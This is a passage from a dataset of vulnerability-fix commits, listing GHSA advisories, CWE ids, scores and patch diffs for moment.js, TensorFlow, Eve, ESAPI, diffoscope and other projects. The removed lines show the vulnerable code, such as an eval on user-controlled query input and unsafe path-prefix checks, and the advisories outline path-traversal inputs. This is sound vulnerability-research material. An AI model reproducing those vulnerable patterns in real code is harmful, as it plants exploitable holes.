assert_eq!(ctx.get_aux::<i64>(0), Ok(Some(&100)));\\n+                assert_eq!(*ctx.get_aux::<i64>(0).unwrap().unwrap(), 100);\\n             }\\n             Ok(true)\\n         })'}}","message_norm":"actually fix auxdata api...","language":"ca","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/functions.rs'])","num_files":1.0},{"index":1218,"vuln_id":"GHSA-8hfj-j24r-96c4","cwe_id":"{'CWE-27', 'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/moment\/moment\/commit\/4211bfc8f15746be4019bba557e29a7ba83d54c5'}","dataset":"osv","summary":"Path Traversal: 'dir\/..\/..\/filename' in moment.locale ### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https:\/\/github.com\/moment\/moment)","published_date":"2022-04-04","chain_len":1,"project":"https:\/\/github.com\/moment\/moment","commit_href":"https:\/\/github.com\/moment\/moment\/commit\/4211bfc8f15746be4019bba557e29a7ba83d54c5","commit_sha":"4211bfc8f15746be4019bba557e29a7ba83d54c5","patch":"SINGLE","chain_ord":"['4211bfc8f15746be4019bba557e29a7ba83d54c5']","before_first_fix_commit":"{'f2a813afcfd0dd6e63812ea74c46ecc627f6a6a6'}","last_fix_commit":"4211bfc8f15746be4019bba557e29a7ba83d54c5","chain_ord_pos":1.0,"commit_datetime":"03\/27\/2022, 11:46:47","message":"[bugfix] Avoid loading path-looking locales from fs","author":"Iskren Chernev","comments":"{'com_1': {'author': 'kuraga', 'datetime': '05\/11\/2022, 17:44:47', 'body': '@ichernev , why two `\\\\\\\\`?'}, 'com_2': {'author': 'omoustaouda', 'datetime': '06\/19\/2022, 12:17:54', 'body': \"@ichernev, thank you for the patch!\\r\\n\\r\\na consideration that come at a first glance: I'd consider allowing only the expected valid characters, \\r\\nlike `it-IT`, `es-ES`, ...\\r\\n\\r\\ninstead of preventing the ones that look not sane,\\r\\nthe reason is that there are uncountable ways to escape chars like `\/` and `\\\\` to look different and possibly not being caught by this regexp.\"}}","stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'src\/lib\/locale\/locales.js': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moment\/moment\/raw\/4211bfc8f15746be4019bba557e29a7ba83d54c5\/src%2Flib%2Flocale%2Flocales.js', 'patch': \"@@ -62,6 +62,11 @@ function chooseLocale(names) {\\n     return globalLocale;\\n }\\n \\n+function isLocaleNameSane(name) {\\n+    \/\/ Prevent names that look like filesystem paths, i.e contain '\/' or '\\\\'\\n+    return name.match('^[^\/\\\\\\\\\\\\\\\\]*$') != null;\\n+}\\n+\\n function loadLocale(name) {\\n     var oldLocale = null,\\n         aliasedRequire;\\n@@ -70,7 +75,8 @@ function loadLocale(name) {\\n         locales[name] === undefined &&\\n         typeof module !== 'undefined' &&\\n         module &&\\n-        module.exports\\n+        module.exports &&\\n+        isLocaleNameSane(name)\\n     ) {\\n         try {\\n             oldLocale = globalLocale._abbr;\"}}","message_norm":"[bugfix] avoid loading path-looking locales from fs","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib\/locale\/locales.js'])","num_files":1.0},{"index":1223,"vuln_id":"GHSA-8jj7-5vxc-pg2q","cwe_id":"{'CWE-190'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0aaaae6eca5a7175a193696383f582f53adab23f'}","dataset":"osv","summary":"Integer overflow in TensorFlow ### Impact\nUnder certain scenarios, Grappler component of TensorFlow is vulnerable to an integer overflow during [cost estimation for crop and resize](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/costs\/op_level_cost_estimator.cc#L2621-L2689). Since the cropping parameters are user controlled, a malicious person can trigger undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [0aaaae6eca5a7175a193696383f582f53adab23f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0aaaae6eca5a7175a193696383f582f53adab23f).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0aaaae6eca5a7175a193696383f582f53adab23f","commit_sha":"0aaaae6eca5a7175a193696383f582f53adab23f","patch":"SINGLE","chain_ord":"['0aaaae6eca5a7175a193696383f582f53adab23f']","before_first_fix_commit":"{'6b5adc0877de832b2a7c189532dbbbc64622eeb6'}","last_fix_commit":"0aaaae6eca5a7175a193696383f582f53adab23f","chain_ord_pos":1.0,"commit_datetime":"11\/13\/2021, 16:19:05","message":"Prevent overflow in grappler cost estimation of crop&resize op.\n\nThe crop parameters are user controlled, so we should make sure a user can not trigger an overflow maliciously.\n\nPiperOrigin-RevId: 409670234\nChange-Id: I7994734a98b037c5642e051240329d16f959aae4","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 22, 'deletions': 7, 'total': 29}","files":"{'tensorflow\/core\/grappler\/costs\/op_level_cost_estimator.cc': {'additions': 22, 'deletions': 7, 'changes': 29, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0aaaae6eca5a7175a193696383f582f53adab23f\/tensorflow%2Fcore%2Fgrappler%2Fcosts%2Fop_level_cost_estimator.cc', 'patch': '@@ -2681,27 +2681,42 @@ Status OpLevelCostEstimator::PredictCropAndResize(const OpContext& op_context,\\n   \/\/ calculation differs from rough estimate in implementation, as it separates\\n   \/\/ out cost per box from cost per pixel and cost per element.\\n \\n+  \/\/ Since crop arguments are user controlled, check for overflow.\\n+  int64_t crop_area = MultiplyWithoutOverflow(crop_height, crop_width);\\n+  if (crop_area < 0)\\n+    return errors::InvalidArgument(\"Cannot estimate cost, multiplying \",\\n+                                   crop_height, \" with \", crop_width,\\n+                                   \" would overflow\");\\n+  int64_t crop_volume = MultiplyWithoutOverflow(crop_area, num_boxes);\\n+  if (crop_volume < 0)\\n+    return errors::InvalidArgument(\"Cannot estimate cost, multiplying \",\\n+                                   crop_area, \" with \", num_boxes,\\n+                                   \" would overflow\");\\n+  int64_t crop_depth = MultiplyWithoutOverflow(crop_height, num_boxes);\\n+  if (crop_depth < 0)\\n+    return errors::InvalidArgument(\"Cannot estimate cost, multiplying \",\\n+                                   crop_height, \" with \", num_boxes,\\n+                                   \" would overflow\");\\n+\\n   \/\/ Ops for variables height_scale and width_scale.\\n   int64_t ops = (sub_cost * 6 + mul_cost * 2 + div_cost * 2) * num_boxes;\\n   \/\/ Ops for variable in_y.\\n-  ops += (mul_cost * 2 + sub_cost + add_cost) * crop_height * num_boxes;\\n+  ops += (mul_cost * 2 + sub_cost + add_cost) * crop_depth;\\n   \/\/ Ops for variable in_x (same computation across both branches).\\n-  ops += (mul_cost * 2 + sub_cost + add_cost) * crop_height * crop_width *\\n-         num_boxes;\\n+  ops += (mul_cost * 2 + sub_cost + add_cost) * crop_volume;\\n   \/\/ Specify op_cost based on the method.\\n   if (use_bilinear_interp) {\\n     \/\/ Ops for variables top_y_index, bottom_y_index, y_lerp.\\n-    ops += (floor_cost + ceil_cost + sub_cost) * crop_height * num_boxes;\\n+    ops += (floor_cost + ceil_cost + sub_cost) * crop_depth;\\n     \/\/ Ops for variables left_x, right_x, x_lerp;\\n-    ops += (floor_cost + ceil_cost + sub_cost) * crop_height * crop_width *\\n-           num_boxes;\\n+    ops += (floor_cost + ceil_cost + sub_cost) * crop_volume;\\n     \/\/ Ops for innermost loop across depth.\\n     ops +=\\n         (cast_to_float_cost * 4 + add_cost * 3 + sub_cost * 3 + mul_cost * 3) *\\n         output_elements;\\n   } else \/* method == \"nearest\" *\/ {\\n     \/\/ Ops for variables closest_x_index and closest_y_index.\\n-    ops += round_cost * 2 * crop_height * crop_width * num_boxes;\\n+    ops += round_cost * 2 * crop_volume;\\n     \/\/ Ops for innermost loop across depth.\\n     ops += cast_to_float_cost * output_elements;\\n   }'}}","message_norm":"prevent overflow in grappler cost estimation of crop&resize op.\n\nthe crop parameters are user controlled, so we should make sure a user can not trigger an overflow maliciously.\n\npiperorigin-revid: 409670234\nchange-id: i7994734a98b037c5642e051240329d16f959aae4","language":"en","entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('overflow', 'SECWORD', ''), ('maliciously', 'SECWORD', ''), ('409670234', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/costs\/op_level_cost_estimator.cc'])","num_files":1.0},{"index":1226,"vuln_id":"GHSA-8jxq-75rw-fhj9","cwe_id":"{'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/pyeve\/eve\/commit\/f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98'}","dataset":"osv","summary":"Eve allows execution of arbitrary code via Code Injection in the where parameter io\/mongo\/parser.py in Eve (aka pyeve) before 0.7.5 allows remote attackers to execute arbitrary code via Code Injection in the where parameter.","published_date":"2018-07-12","chain_len":1,"project":"https:\/\/github.com\/pyeve\/eve","commit_href":"https:\/\/github.com\/pyeve\/eve\/commit\/f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98","commit_sha":"f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98","patch":"SINGLE","chain_ord":"['f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98']","before_first_fix_commit":"{'6d1526bf8ad93a3d259b1fd357f0c40e4ed9dbf5'}","last_fix_commit":"f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98","chain_ord_pos":1.0,"commit_datetime":"01\/14\/2018, 16:51:26","message":"fix mongo visitor parser","author":"Nicola Iarocci","comments":null,"stats":"{'additions': 9, 'deletions': 6, 'total': 15}","files":"{'eve\/io\/mongo\/parser.py': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pyeve\/eve\/raw\/f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98\/eve%2Fio%2Fmongo%2Fparser.py', 'patch': '@@ -122,16 +122,19 @@ def visit_Call(self, node):\\n         datetime().\\n         \"\"\"\\n         if isinstance(node.func, ast.Name):\\n-            expr = None\\n             if node.func.id == \\'ObjectId\\':\\n-                expr = \"(\\'\" + node.args[0].s + \"\\')\"\\n+                try:\\n+                    self.current_value = ObjectId(node.args[0].s)\\n+                except:\\n+                    pass\\n             elif node.func.id == \\'datetime\\':\\n                 values = []\\n                 for arg in node.args:\\n-                    values.append(str(arg.n))\\n-                expr = \"(\" + \", \".join(values) + \")\"\\n-            if expr:\\n-                self.current_value = eval(node.func.id + expr)\\n+                    values.append(arg.n)\\n+                try:\\n+                    self.current_value = datetime(*values)\\n+                except:\\n+                    pass\\n \\n     def visit_Attribute(self, node):\\n         \"\"\" Attribute handler (\\'Contact.Id\\').'}}","message_norm":"fix mongo visitor parser","language":"it","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['eve\/io\/mongo\/parser.py'])","num_files":1.0},{"index":1228,"vuln_id":"GHSA-8m49-2xj8-67v9","cwe_id":"{'CWE-59'}","score":7.1,"chain":"{'https:\/\/github.com\/waycrate\/swhkd\/commit\/0b620a09605afb815c6d8d8953bbb7a10a8c0575'}","dataset":"osv","summary":"Data Loss\/Denial of Service in SWHKD SWHKD 1.1.5 unsafely uses the \/tmp\/swhks.pid pathname. There can be data loss or a denial of service. A patch is available on the `1.1.0` branch of the repository.","published_date":"2022-03-31","chain_len":1,"project":"https:\/\/github.com\/waycrate\/swhkd","commit_href":"https:\/\/github.com\/waycrate\/swhkd\/commit\/0b620a09605afb815c6d8d8953bbb7a10a8c0575","commit_sha":"0b620a09605afb815c6d8d8953bbb7a10a8c0575","patch":"SINGLE","chain_ord":"['0b620a09605afb815c6d8d8953bbb7a10a8c0575']","before_first_fix_commit":"{'f70b99dd575fab79d8a942111a6980431f006818'}","last_fix_commit":"0b620a09605afb815c6d8d8953bbb7a10a8c0575","chain_ord_pos":1.0,"commit_datetime":"03\/25\/2022, 15:20:01","message":"[patch] CVE-2022-27816","author":"Shinyzenith","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/server.rs': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/waycrate\/swhkd\/raw\/0b620a09605afb815c6d8d8953bbb7a10a8c0575\/src%2Fserver.rs', 'patch': '@@ -12,7 +12,7 @@ fn main() -> std::io::Result<()> {\\n     env::set_var(\"RUST_LOG\", \"swhks=trace\");\\n     env_logger::init();\\n \\n-    let pid_file_path = String::from(\"\/tmp\/swhks.pid\");\\n+    let pid_file_path = String::from(format!(\"\/run\/user\/{}\/swhks.pid\", unistd::Uid::current()));\\n     let sock_file_path = String::from(format!(\"\/run\/user\/{}\/swhkd.sock\", unistd::Uid::current()));\\n \\n     if Path::new(&pid_file_path).exists() {'}}","message_norm":"[patch] cve-2022-27816","language":"en","entities":"[('cve-2022-27816', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/server.rs'])","num_files":1.0},{"index":1229,"vuln_id":"GHSA-8m5h-hrqm-pxm2","cwe_id":"{'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/ESAPI\/esapi-java-legacy\/commit\/a0d67b75593878b1b6e39e2acc1773b3effedb2a'}","dataset":"osv","summary":"Path traversal in the OWASP Enterprise Security API ### Impact\nThe default implementation of `Validator.getValidDirectoryPath(String, String, File, boolean)` may incorrectly treat the tested input string as a child of the specified parent directory. This potentially could allow control-flow bypass checks to be defeated if an attack can specify the entire string representing the 'input' path.\n\n### Patches\nThis vulnerability is patched in release 2.3.0.0 of ESAPI. See https:\/\/github.com\/ESAPI\/esapi-java-legacy\/releases\/tag\/esapi-2.3.0.0 for details.\n\n### Workarounds\nYes; in theory, one _could_ write the own implementation of the Validator interface. This would most easily be done by sub-classing a version of the affected `DefaultValidator` class and then overriding the affected `getValidDirectoryPath()` to correct the issue. However, this is not recommended.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email one of the project co-leaders. See email addresses listed on  the [OWASP ESAPI wiki](https:\/\/owasp.org\/www-project-enterprise-security-api\/) page, under \"Leaders\".\n* Send email to one of the two ESAPI related Google Groups listed under [Where to Find More Information on ESAPI](https:\/\/github.com\/ESAPI\/esapi-java-legacy#where-to-find-more-information-on-esapi) on our [README.md](https:\/\/github.com\/ESAPI\/esapi-java-legacy#readme) page.","published_date":"2022-04-27","chain_len":1,"project":"https:\/\/github.com\/ESAPI\/esapi-java-legacy","commit_href":"https:\/\/github.com\/ESAPI\/esapi-java-legacy\/commit\/a0d67b75593878b1b6e39e2acc1773b3effedb2a","commit_sha":"a0d67b75593878b1b6e39e2acc1773b3effedb2a","patch":"SINGLE","chain_ord":"['a0d67b75593878b1b6e39e2acc1773b3effedb2a']","before_first_fix_commit":"{'657c2a751c0b8dbd70b8da1bba246d86f7ad3b20'}","last_fix_commit":"a0d67b75593878b1b6e39e2acc1773b3effedb2a","chain_ord_pos":1.0,"commit_datetime":"04\/17\/2022, 04:32:15","message":"Fix for GHSL-2022-008 vulnerability.","author":"kwwall","comments":"{'com_1': {'author': 'JLLeitschuh', 'datetime': '04\/29\/2022, 00:50:01', 'body': 'For back tracking this is related to CVE-2022-23457\\r\\n\\r\\nhttps:\/\/github.com\/ESAPI\/esapi-java-legacy\/security\/advisories\/GHSA-8m5h-hrqm-pxm2'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/main\/java\/org\/owasp\/esapi\/reference\/DefaultValidator.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ESAPI\/esapi-java-legacy\/raw\/a0d67b75593878b1b6e39e2acc1773b3effedb2a\/src%2Fmain%2Fjava%2Forg%2Fowasp%2Fesapi%2Freference%2FDefaultValidator.java', 'patch': '@@ -466,7 +466,7 @@ public String getValidDirectoryPath(String context, String input, File parent, b\\n \\t\\t\\tif ( !parent.isDirectory() ) {\\n \\t\\t\\t\\tthrow new ValidationException( context + \": Invalid directory name\", \"Invalid directory, specified parent is not a directory: context=\" + context + \", input=\" + input + \", parent=\" + parent );\\n \\t\\t\\t}\\n-\\t\\t\\tif ( !dir.getCanonicalPath().startsWith(parent.getCanonicalPath() ) ) {\\n+\\t\\t\\tif ( !dir.getCanonicalFile().toPath().startsWith( parent.getCanonicalFile().toPath() ) ) { \/\/ Fixes GHSL-2022-008\\n \\t\\t\\t\\tthrow new ValidationException( context + \": Invalid directory name\", \"Invalid directory, not inside specified parent: context=\" + context + \", input=\" + input + \", parent=\" + parent );\\n \\t\\t\\t}'}}","message_norm":"fix for ghsl-2022-008 vulnerability.","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/owasp\/esapi\/reference\/DefaultValidator.java'])","num_files":1.0},{"index":1230,"vuln_id":"GHSA-8m9g-647g-5pxw","cwe_id":"{'CWE-835'}","score":5.4,"chain":"{'https:\/\/github.com\/Yubico\/yubihsm-connector\/commit\/82bdf202c53460bac9106cc9b4b34a0a16cae0ed'}","dataset":"osv","summary":"Infinite loop in Yubico yubihsm-connector An issue was discovered in the \/api\/connector endpoint handler in Yubico yubihsm-connector before 3.0.1 (in YubiHSM SDK before 2021.04). The handler did not validate the length of the request, which can lead to a state where yubihsm-connector becomes stuck in a loop waiting for the YubiHSM to send it data, preventing any further operations until the yubihsm-connector is restarted. An attacker can send 0, 1, or 2 bytes to trigger this.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/Yubico\/yubihsm-connector","commit_href":"https:\/\/github.com\/Yubico\/yubihsm-connector\/commit\/82bdf202c53460bac9106cc9b4b34a0a16cae0ed","commit_sha":"82bdf202c53460bac9106cc9b4b34a0a16cae0ed","patch":"SINGLE","chain_ord":"['82bdf202c53460bac9106cc9b4b34a0a16cae0ed']","before_first_fix_commit":"{'33e94e9034ffc52e29639386a191abd9b455d84b'}","last_fix_commit":"82bdf202c53460bac9106cc9b4b34a0a16cae0ed","chain_ord_pos":1.0,"commit_datetime":"03\/15\/2021, 13:00:39","message":"Check content-length to avoid denial-of-service","author":"Per Nilsson","comments":null,"stats":"{'additions': 6, 'deletions': 6, 'total': 12}","files":"{'api.go': {'additions': 6, 'deletions': 6, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Yubico\/yubihsm-connector\/raw\/82bdf202c53460bac9106cc9b4b34a0a16cae0ed\/api.go', 'patch': '@@ -177,19 +177,19 @@ func apiHandler(w http.ResponseWriter, r *http.Request, timeout time.Duration, s\\n \\t\\treturn\\n \\t}\\n \\n+\\tif r.ContentLength < 3 || r.ContentLength > 2048 {\\n+\\t\\thttp.Error(w, http.StatusText(http.StatusBadRequest),\\n+\\t\\t\\thttp.StatusBadRequest)\\n+\\t\\treturn\\n+\\t}\\n+\\n \\tif buf, err = ioutil.ReadAll(r.Body); err != nil {\\n \\t\\tclog.WithError(err).Error(\"failed reading incoming request\")\\n \\t\\thttp.Error(w, http.StatusText(http.StatusInternalServerError),\\n \\t\\t\\thttp.StatusInternalServerError)\\n \\t\\treturn\\n \\t}\\n \\n-\\tif len(buf) < 3 || len(buf) > 2048 {\\n-\\t\\thttp.Error(w, http.StatusText(http.StatusBadRequest),\\n-\\t\\t\\thttp.StatusBadRequest)\\n-\\t\\treturn\\n-\\t}\\n-\\n \\tif buf, err = usbProxy(buf, cid, timeout, serial); err != nil {\\n \\t\\tclog.WithError(err).Error(\"failed usb proxy\")\\n \\t\\thttp.Error(w, http.StatusText(http.StatusInternalServerError),'}}","message_norm":"check content-length to avoid denial-of-service","language":"en","entities":"[('denial-of-service', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['api.go'])","num_files":1.0},{"index":1233,"vuln_id":"GHSA-8p36-q63g-68qh","cwe_id":"{'CWE-915'}","score":9.1,"chain":"{'https:\/\/github.com\/mitreid-connect\/OpenID-Connect-Java-Spring-Server\/commit\/7eba3c12fed82388f917e8dd9b73e86e3a311e4c'}","dataset":"osv","summary":"Autobinding vulnerability in MITREid Connect org\/mitre\/oauth2\/web\/OAuthConfirmationController.java in the OpenID Connect server implementation for MITREid Connect through 1.3.3 contains a Mass Assignment (aka Autobinding) vulnerability. This arises due to unsafe usage of the @ModelAttribute annotation during the OAuth authorization flow, in which HTTP request parameters affect an authorizationRequest.","published_date":"2021-05-13","chain_len":1,"project":"https:\/\/github.com\/mitreid-connect\/OpenID-Connect-Java-Spring-Server","commit_href":"https:\/\/github.com\/mitreid-connect\/OpenID-Connect-Java-Spring-Server\/commit\/7eba3c12fed82388f917e8dd9b73e86e3a311e4c","commit_sha":"7eba3c12fed82388f917e8dd9b73e86e3a311e4c","patch":"SINGLE","chain_ord":"['7eba3c12fed82388f917e8dd9b73e86e3a311e4c']","before_first_fix_commit":"{'0d4ef2cb4f77bea5df9e2d4f1cfff4dffb7045c0'}","last_fix_commit":"7eba3c12fed82388f917e8dd9b73e86e3a311e4c","chain_ord_pos":1.0,"commit_datetime":"02\/12\/2021, 15:22:12","message":"Fix Spring Autobinding vulnerability\n\n1. Make authorizationRequest no longer affected by http request parameters due to @ModelAttribute. See http:\/\/agrrrdog.blogspot.com\/2017\/03\/autobinding-vulns-and-spring-mvc.html","author":"Michael Stepankin","comments":"{'com_1': {'author': 'abergmann', 'datetime': '02\/24\/2021, 07:32:35', 'body': '[CVE-2021-27582](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-27582) was assigned to this commit.'}}","stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'openid-connect-server\/src\/main\/java\/org\/mitre\/oauth2\/web\/OAuthConfirmationController.java': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mitreid-connect\/OpenID-Connect-Java-Spring-Server\/raw\/7eba3c12fed82388f917e8dd9b73e86e3a311e4c\/openid-connect-server%2Fsrc%2Fmain%2Fjava%2Forg%2Fmitre%2Foauth2%2Fweb%2FOAuthConfirmationController.java', 'patch': '@@ -103,9 +103,9 @@ public OAuthConfirmationController(ClientDetailsEntityService clientService) {\\n \\n \\t@PreAuthorize(\"hasRole(\\'ROLE_USER\\')\")\\n \\t@RequestMapping(\"\/oauth\/confirm_access\")\\n-\\tpublic String confimAccess(Map<String, Object> model, @ModelAttribute(\"authorizationRequest\") AuthorizationRequest authRequest,\\n-\\t\\t\\tPrincipal p) {\\n+\\tpublic String confirmAccess(Map<String, Object> model, Principal p) {\\n \\n+\\t\\tAuthorizationRequest authRequest = (AuthorizationRequest) model.get(\"authorizationRequest\");\\n \\t\\t\/\/ Check the \"prompt\" parameter to see if we need to do special processing\\n \\n \\t\\tString prompt = (String)authRequest.getExtensions().get(PROMPT);'}}","message_norm":"fix spring autobinding vulnerability\n\n1. make authorizationrequest no longer affected by http request parameters due to @modelattribute. see http:\/\/agrrrdog.blogspot.com\/2017\/03\/autobinding-vulns-and-spring-mvc.html","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('http:\/\/agrrrdog.blogspot.com\/2017\/03\/autobinding-vulns-and-spring-mvc.html', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['openid-connect-server\/src\/main\/java\/org\/mitre\/oauth2\/web\/OAuthConfirmationController.java'])","num_files":1.0},{"index":1234,"vuln_id":"GHSA-8p5c-f328-9fvv","cwe_id":"{'CWE-22'}","score":9.8,"chain":"{'https:\/\/github.com\/anthraxx\/diffoscope\/commit\/632a40828a54b399787c25e7fa243f732aef7e05'}","dataset":"osv","summary":"Diffoscope may write to arbitrary locations due to an untrusted archive diffoscope before 76 writes to arbitrary locations on disk based on the contents of an untrusted archive.","published_date":"2018-07-13","chain_len":1,"project":"https:\/\/github.com\/anthraxx\/diffoscope","commit_href":"https:\/\/github.com\/anthraxx\/diffoscope\/commit\/632a40828a54b399787c25e7fa243f732aef7e05","commit_sha":"632a40828a54b399787c25e7fa243f732aef7e05","patch":"SINGLE","chain_ord":"['632a40828a54b399787c25e7fa243f732aef7e05']","before_first_fix_commit":"{'b468a2840a097f4b2f7719929d690d5738dbcae4'}","last_fix_commit":"632a40828a54b399787c25e7fa243f732aef7e05","chain_ord_pos":1.0,"commit_datetime":"02\/09\/2017, 21:47:05","message":"Extract archive members using an auto-incrementing integer, avoiding the need to sanitise filenames. (Closes: #854723)\n\nSigned-off-by: Chris Lamb <lamby@debian.org>","author":"Chris Lamb","comments":null,"stats":"{'additions': 14, 'deletions': 27, 'total': 41}","files":"{'diffoscope\/comparators\/utils\/libarchive.py': {'additions': 14, 'deletions': 27, 'changes': 41, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/anthraxx\/diffoscope\/raw\/632a40828a54b399787c25e7fa243f732aef7e05\/diffoscope%2Fcomparators%2Futils%2Flibarchive.py', 'patch': '@@ -23,6 +23,7 @@\\n import ctypes\\n import logging\\n import libarchive\\n+import collections\\n \\n from diffoscope.tempfiles import get_temporary_directory\\n \\n@@ -168,11 +169,11 @@ def close_archive(self):\\n \\n     def get_member_names(self):\\n         self.ensure_unpacked()\\n-        return self._member_names\\n+        return self._members.keys()\\n \\n     def extract(self, member_name, dest_dir):\\n         self.ensure_unpacked()\\n-        return os.path.join(self._unpacked, member_name)\\n+        return self._members[member_name]\\n \\n     def get_member(self, member_name):\\n         with libarchive.file_reader(self.source.path) as archive:\\n@@ -197,45 +198,31 @@ def get_subclass(self, entry):\\n         return LibarchiveMember(self, entry)\\n \\n     def ensure_unpacked(self):\\n-        if hasattr(self, \\'_unpacked\\'):\\n+        if hasattr(self, \\'_members\\'):\\n             return\\n \\n-        self._unpacked = get_temporary_directory().name\\n-        self._member_names = []\\n+        tmpdir = get_temporary_directory().name\\n+        self._members = collections.OrderedDict()\\n \\n-        logger.debug(\"Extracting %s to %s\", self.source.path, self._unpacked)\\n+        logger.debug(\"Extracting %s to %s\", self.source.path, tmpdir)\\n \\n         with libarchive.file_reader(self.source.path) as archive:\\n-            for entry in archive:\\n-                self._member_names.append(entry.pathname)\\n+            for idx, entry in enumerate(archive):\\n+                # Maintain a mapping of archive path to the extracted path,\\n+                # avoiding the need to sanitise filenames.\\n+                dst = os.path.join(tmpdir, \\'{}\\'.format(idx))\\n+                self._members[entry.pathname] = dst\\n \\n                 if entry.isdir:\\n                     continue\\n \\n-                # All extracted locations must be underneath self._unpacked\\n-                force_prefix = os.path.join(self._unpacked, \"\")\\n-\\n-                # Try to pick a safe and reasonable candidate name\\n-                candidate_name = os.path.normpath(entry.pathname.rstrip(\\'\/\\' + os.sep))\\n-                if os.path.isabs(candidate_name):\\n-                    candidate_name = os.path.relpath(candidate_name, os.path.join(os.path.sep))\\n-\\n-                dst = os.path.normpath(os.path.join(self._unpacked, candidate_name))\\n-                if not dst.startswith(force_prefix):\\n-                    logger.warn(\"Skipping member because we could not make a safe name to extract it to: \\'%s\\'\",\\n-                                entry.pathname)\\n-                    continue\\n-\\n-                # TODO: need to fix reading these cleaned members. currently\\n-                # reading will still try to use the uncleaned name.\\n-                #logging.debug(\"Extracting %s to %s\", entry.pathname, dst)\\n-                os.makedirs(os.path.dirname(dst), exist_ok=True)\\n+                logger.debug(\"Extracting %s to %s\", entry.pathname, dst)\\n \\n                 with open(dst, \\'wb\\') as f:\\n                     for block in entry.get_blocks():\\n                         f.write(block)\\n \\n         logger.debug(\\n             \"Extracted %d entries from %s to %s\",\\n-            len(self._member_names), self.source.path, self._unpacked,\\n+            len(self._members), self.source.path, tmpdir,\\n         )'}}","message_norm":"extract archive members using an auto-incrementing integer, avoiding the need to sanitise filenames. (closes: #854723)\n\nsigned-off-by: chris lamb <lamby@debian.org>","language":"en","entities":"[('sanitise', 'SECWORD', ''), ('#854723', 'ISSUE', ''), ('lamby@debian.org', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['diffoscope\/comparators\/utils\/libarchive.py'])","num_files":1.0},{"index":1235,"vuln_id":"GHSA-8p9r-f949-699g","cwe_id":"{'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/browserless\/chrome\/commit\/848b87e5bea4f8473eea85261a5ff922d6ebd2b6'}","dataset":"osv","summary":"Path Traversal in browserless-chrome This affects all versions of browserless-chrome before 1.43.0. User input flowing from the workspace endpoint gets used to create a file path filePath and this is fetched and then sent back to a user. This can be escaped to fetch arbitrary files from a 